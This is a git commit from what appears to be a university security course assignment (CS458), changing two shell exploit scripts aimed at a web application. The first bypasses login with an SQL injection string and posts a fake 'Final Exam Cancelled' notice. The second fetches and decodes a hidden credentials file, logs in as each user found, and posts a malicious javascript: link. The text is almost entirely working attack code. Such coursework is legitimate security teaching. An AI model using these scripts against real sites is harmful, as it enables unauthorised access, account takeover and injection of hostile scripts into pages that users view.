d2f173028c954a39c2c7e47f2561cbde0d4a9caf
Andrei Savin (MacBook) <glork2006@gmail.com>
2016-10-23 21:03:52 -0400

    CS458 a2 sploit2: url hack

--- CS458/A2/Web/1/sploit.sh
+++ CS458/A2/Web/1/sploit.sh
@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 
 POST_URL="${1}/post.php"
 SQL_INJECTION=$'\' OR 1=1 /*'
@@ -7,10 +7,12 @@ echo "Exploiting SQL Injection..."
 curl -d "username=${SQL_INJECTION}&password=p&form=login&submit=Login" -c cookies ${POST_URL}
 curl -L -b cookies -s ${1} | awk '/Welcome, ([a-z]+)!/ { print $1 " " $2 }' 
 
-echo "\n"
+echo ""
 
 echo "Creating a new post..."
 curl -L -b cookies -d "title=Final+Exam+Cancelled&content=Everyone+will+get+100&type=1&form=content&submit=submit" -s ${POST_URL} | grep "Final Exam Cancelled"
 
-echo "\n"
+echo ""
 echo "DONE"
+
+rm cookies
---
+++ CS458/A2/Web/2/sploit.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+
+POST_URL="${1}/post.php"
+HIDDEN_FILE="${1}/docs/file"
+
+curl -s ${HIDDEN_FILE} | base64 -D > decoded_file
+echo "" >> decoded_file
+
+while read line; do
+    credentials=($line)
+    
+    username="${credentials[0]}"
+    password="${credentials[1]}"
+   
+    echo "Attempting to log in as $username:$password..."
+    echo "form=login&submit=Login&username=${username}&password=${password}" | curl -d @- -c cookies ${POST_URL}
+    curl -L -b cookies -s ${1} | awk '/Welcome, ([a-z]+)!/ { print $1 " " $2 }' 
+
+    echo "Attempting to post a link..."
+    echo "form=content&title=Trustworthy+Website&content=javascript%3Awhile%281%29alert%28%29&type=2" | curl -L -b cookies -d @- -s ${POST_URL} > /dev/null
+
+    echo ""
+
+done < decoded_file
+
+rm decoded_file cookies
